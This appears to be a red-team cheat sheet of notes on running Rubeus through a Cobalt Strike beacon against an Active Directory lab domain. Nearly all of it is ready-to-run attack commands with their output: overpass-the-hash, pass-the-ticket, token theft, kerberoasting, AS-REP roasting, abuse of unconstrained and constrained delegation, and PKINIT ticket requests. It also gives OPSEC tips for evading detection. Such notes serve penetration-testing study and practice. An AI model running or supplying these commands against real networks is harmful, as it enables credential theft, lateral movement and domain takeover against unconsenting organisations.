# Rubeus

## Request TGT and inject into sacrificial process
1. Check permissions
``````beacon
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)
``````
2.  Ask for TGT with aes256 hash gathered via [[eKeys]] or [[LSASS dumping]] and create a new logon session
``````beacon
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

[*] Action: Ask TGT
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3044
[+] LUID            : 0x85a103

[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1
[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\doe'
[*] Target LUID : 8757507
[+] TGT request successful!
[*] base64(ticket.kirbi):

 [...ticket...]

[*] Target LUID: 0x85a103
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/edu.evil.corp
  ServiceRealm          :  edu.evil.corp
  UserName              :  doe
  UserRealm             :  edu.evil.corp
  StartTime             :  3/4/2022 12:48:16 PM
  EndTime               :  3/4/2022 10:48:16 PM
  RenewTill             :  3/11/2022 12:48:16 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  Jr93ezQ6z+rc0/1h30UXaGxVkRLVsWSl9mG0nNeXuTU=
``````
3. Steal the logon session token
``````beacon
beacon> steal_token 3044
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\srv2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 dir     05/10/2022 04:11:30   $Recycle.Bin
 dir     05/10/2022 03:23:44   Boot
 ``````

## Extract Kerberos Tickets
1. Make sure the Service is krbtgt/domain and note down the LUID
``````Rubeus
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ------------------------------------------------------------------------------
| LUID     | UserName                     | Service                                       | EndTime               |
 ------------------------------------------------------------------------------
 | 0x462eb | doe @ edu.evil.corp    | krbtgt/edu.evil.corp                      | 5/12/2022 12:34:03 AM |
 | 0x25ff6 | john @ edu.evil.corp  | krbtgt/edu.evil.corp                      | 5/12/2022 12:33:41 AM |
 ------------------------------------------------------------------------------
 ``````
2. Extract the ticket
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap

[*] Target service  : krbtgt
[*] Target LUID     : 0x462eb
[*] Current LUID    : 0x3e7

  UserName                 : doe
  Domain                   : EDU
  LogonId                  : 0x462eb
  UserSID                  : S-1-5-21-3263068140-2042698922-2891547269-1122
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 5/11/2022 2:34:03 PM
  LogonServer              : DC-2
  LogonServerDNSDomain     : edu.evil.corp
  UserPrincipalName        : doe@edu.evil.corp

 ServiceName           :  krbtgt/edu.evil.corp
 ServiceRealm          :  edu.evil.corp
 UserName              :  doe
 UserRealm             :  edu.evil.corp
 StartTime             :  5/11/2022 2:34:03 PM
 EndTime               :  5/12/2022 12:34:03 AM
 RenewTill             :  5/18/2022 2:34:03 PM
 Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
 KeyType               :  aes256_cts_hmac_sha1
 Base64(key)           :  oh0gqFF8D81ijGlce+jyc0yMtHYaDrl8AM0b4+BqO8E=
 Base64EncodedTicket   :

 [...ticket...]
``````
3. Create a sacrificial logon session or use 
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4872
[+] LUID            : 0x92a8c
``````
4. Use [[Pass-the-Ticket]] to pass the extracted TGT into the logon session via /luid
``````beacon
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]

[*] Action: Import Ticket
[*] Target LUID: 0x92a8c
[+] Ticket successfully imported!
``````
5. Steal the access token
``````beacon
steal_token 4872
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\srv2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 dir     05/10/2022 04:11:30   $Recycle.Bin
 dir     05/10/2022 03:23:44   Boot
 ``````

## Make_token / new logon session
```beacon
make_token EXT\i.wood abcdefg
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /ticket:awdawd
```

## [[Kerberoasting]]
⚠️ This will kerberoast ALL accounts with SPN's!
#OPSEC only do targeted kerberoast
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap

[*] Action: Kerberoasting
[*] Searching the current domain for Kerberoastable users
[*] Total kerberoastable users : 2

$krb5tgs$23$*svc_mssql$edu.evil.corp$MSSQLSvc/srv1.edu.evil.corp:1433*$[...hash...]
$krb5tgs$23$*svc_honey$edu.evil.corp$HoneySvc/fake.edu.evil.corp*$[...hash...]
``````

## Targeted [[Kerberoasting]]
1. Identify users: [[ADSearch#Identify kerberoastable Users]]
2. Targeted [[Kerberoasting]]
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap

[*] Action: Kerberoasting
[*] Target User            : svc_mssql
[*] Searching the current domain for Kerberoastable users
[*] Total kerberoastable users : 1
[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=edu,DC=evil,DC=corp
[*] ServicePrincipalName   : MSSQLSvc/srv1.edu.evil.corp:1433
[*] PwdLastSet             : 5/14/2022 1:28:34 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$edu.evil.corp$MSSQLSvc/srv1.edu.evil.corp:1433*$[...hash...]
``````
3. Cracking with [[Hashcat#Cracking krb5tgs]]

## [[AS-REP Roasting]]
1. Identify users: [[ADSearch#Identify as-rep roastable user]]
2. [[AS-REP Roasting]]
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap

[*] Action: AS-REP roasting

[*] Target User            : svc_oracle
[*] Target Domain          : edu.evil.corp

[*] Searching path 'LDAP://dc-2.edu.evil.corp/DC=edu,DC=evil,DC=corp' for AS-REP roastable users
[*] SamAccountName         : svc_oracle
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=edu,DC=evil,DC=corp
[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'edu.evil.corp\svc_oracle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

 $krb5asrep$svc_oracle@edu.evil.corp:F3B1A1 [...snip...] D6D049
``````
3. Cracking with [[Hashcat#Cracking krb5asrep]]

## [[Unconstrained Delegation]]
Requires Admin
Monitor with [[Rubeus]] for new cached TGT's
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:patrick /interval:10

[*] Action: TGT Monitoring
[*] Target user     : patrick
[*] Monitoring every 10 seconds for new TGTs

jobs

jobkill 1
``````

Write the base64 decoded string to a `.kirbi` file, create a new sacrificial logon session, pass the TGT [[Overpass-the-Hash#Manual]]

## [[Constrained Delegation]]
Require Admin
1. Gather computer aes256 hash via [[eKeys]]
2. Automatically request TGS for specific service
Where:
- `/impersonateuser` is the user we want to impersonate. `patrick` is a domain admin but you want to ensure this user has local admin access to the target (WKSTN2).
- `/msdsspn` is the service principal name that SRV2 is allowed to delegate to.
- `/user` is the principal allowed to perform the delegation.
- `/aes256` is the AES256 key of the `/user`.
- `/opsec` tells Rubeus to more closely mimic genuine S4U2Self and S4U2Proxy requests (can only be used with `aes256`).
- `/ptt` [[Pass-the-Ticket]], tells Rubeus to pass the generated tickets directly into the current logon session.
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:patrick /msdsspn:cifs/wkstn2.edu.evil.corp /user:srv2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt

[*] Action: S4U

[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Using aes256_cts_hmac_sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d
[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\srv2$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

 doIFLD [...snip...] MuSU8=

[*] Action: S4U

[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Building S4U2self request for: 'SRV2$@edu.evil.corp'
[+] Sequence number is: 1703507608
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'patrick' to 'SRV2$@edu.evil.corp'
[*] base64(ticket.kirbi):

 doIFfj [...snip...] JWLTIk

[*] Impersonating user 'patrick' to target SPN 'cifs/wkstn2.edu.evil.corp'
[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Building S4U2proxy request for service: 'cifs/wkstn2.edu.evil.corp'
[+] Sequence number is: 326551889
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/wkstn2.edu.evil.corp':

 doIGwj [..snip...] ljLmlv

[+] Ticket successfully imported!

beacon> ls \\wkstn2.edu.evil.corp\c$
  
 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 dir     05/19/2022 14:35:19   $Recycle.Bin
 dir     05/10/2022 03:23:44   Boot
``````

## Alternate Service Name
This is an special case of [[Constrained Delegation]], were the service is not useful.
We can request a TGS for any service run by DC-2, using `/altservice` flag in Rubeus.
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.edu.evil.corp /altservice:cifs /user:srv2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt

[*] Action: S4U

[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Using aes256-cts-hmac-sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d
[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\srv2$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

 doIFLD [...snip...] MuSU8=

[*] Action: S4U

[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Building S4U2self request for: 'SRV2$@edu.evil.corp'
[+] Sequence number is: 1421721239
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'SRV2$@edu.evil.corp'
[*] base64(ticket.kirbi):

 doIFfj [...snip...] WLTIk

[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.edu.evil.corp'
[*]   Final tickets will be for the alternate services 'cifs'
[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Building S4U2proxy request for service: 'eventlog/dc-2.edu.evil.corp'
[+] Sequence number is: 1070349348
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.edu.evil.corp':

 doIGvD [...snip...] ljLmlv

[+] Ticket successfully imported!

beacon> ls \\dc-2.edu.evil.corp\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 dir     05/10/2022 04:11:30   $Recycle.Bin
 dir     05/10/2022 03:23:44   Boot
 ``````

## Check stored TGT
Use `Rubeus describe` to show information about the ticket.
``````beacon
execute-assembly Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn2-s4u.kirbi

[*] Action: Describe Ticket

  ServiceName              :  WKSTN2$
  ServiceRealm             :  edu.evil.corp
  UserName                 :  patrick
  UserRealm                :  edu.evil.corp
  StartTime                :  2/28/2022 7:30:02 PM
  EndTime                  :  3/1/2022 5:19:32 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
``````

## Ask TGT via certificate
``````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:nglover /certificate:MIIM5wIBAz[...snip...]dPAgIIAA== /password:password /aes256 /nowrap

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=Isabel Yates, CN=Users, DC=evil, DC=corp 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'evil.corp\nglover'
[+] TGT request successful!
[*] base64(ticket.kirbi):

 doIGNjCCB[...snip...]pYy5pbw==

  ServiceName              :  krbtgt/evil.corp
  ServiceRealm             :  EVIL.CORP
  UserName                 :  nglover
  UserRealm                :  EVIL.CORP
  StartTime                :  1/18/2022 4:38:26 PM
  EndTime                  :  1/19/2022 2:38:26 AM
  RenewTill                :  1/25/2022 4:38:26 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  unJ966veiMXllOu4n88hvAcX/6j71To9JJU5Ec48Pds=
  ASREP (key)              :  6F8361B5177CCC416E67A297C9D61AC975DEAA9E0505DE86657F16EAE9AD8F72
``````

## [[Overpass-the-Hash]]
Rubeus allows us to perform opth without needing elevated privileges. The process to follow is:

-   Request a TGT for the user we want to impersonate.
-   Create a sacrificial logon session.
-   Pass the TGT into that logon session.
-   Access the target resource.

#OPSEC Rubeus also has an `/opsec` argument which tells it to send the request without pre-auth, to more closely emulate genuine Kerberos traffic.

### SHA256
1. Request a hash via [[eKeys]] or [[LSASS dumping]] (not recommended anymore)
2. Ask for a TGT
```````beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec

[*] Action: Ask TGT

[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1
[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\doe'
[+] TGT request successful!
[*] base64(ticket.kirbi):

 [...ticket...]

  ServiceName           :  krbtgt/edu.evil.corp
  ServiceRealm          :  edu.evil.corp
  UserName              :  doe
  UserRealm             :  edu.evil.corp
  StartTime             :  7/9/2022 2:58:21 PM
  EndTime               :  7/10/2022 12:58:21 AM
  RenewTill             :  7/16/2022 2:58:21 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  x4F1hxBrfwvgleEHnYbg9KV5fch2VOS5m36IO/srA0g=
```````

### RC4
``````beacon
Most public articles demonstrate using the NTLM hash to request the TGT.

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 4ffd3eabdce2e158d923ddec72de979e
[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\doe'
[+] TGT request successful!
[*] base64(ticket.kirbi):

 [...ticket...]

  ServiceName           :  krbtgt/edu.evil.corp
  ServiceRealm          :  edu.evil.corp
  UserName              :  doe
  UserRealm             :  edu.evil.corp
  StartTime             :  7/9/2022 2:46:58 PM
  EndTime               :  7/10/2022 12:46:58 AM
  RenewTill             :  7/16/2022 2:46:58 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  Z1/VMlSwxK4jrbL8qmjvNw==
``````


```meta
phases: 08,09,10
requirements: 
results: 
oss: #win
source: https://github.com/GhostPack/Rubeus
description: 
```